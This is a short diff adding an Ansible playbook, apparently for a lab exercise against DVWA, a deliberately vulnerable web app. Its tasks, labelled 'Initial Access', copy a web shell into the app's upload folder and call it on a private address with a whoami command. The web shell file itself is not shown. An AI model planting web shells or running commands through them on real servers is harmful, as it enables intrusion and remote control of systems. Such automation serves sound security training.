@@ -1,0 +1,16 @@
+---
+- name: Initial Access - Upload mini webshell
+  copy:
+    src: /path/to/local/webshell.php
+    dest: /var/www/html/DVWA/hackable/uploads/shell.php
+    mode: '0755'
+
+- name: Initial Access - Test access to uploaded webshell
+  uri:
+    url: "http://192.168.254.129/DVWA/hackable/uploads/shell.php?cmd=whoami"
+    return_content: yes
+  register: shell_output
+
+- name: Show webshell execution result
+  debug:
+    var: shell_output.content
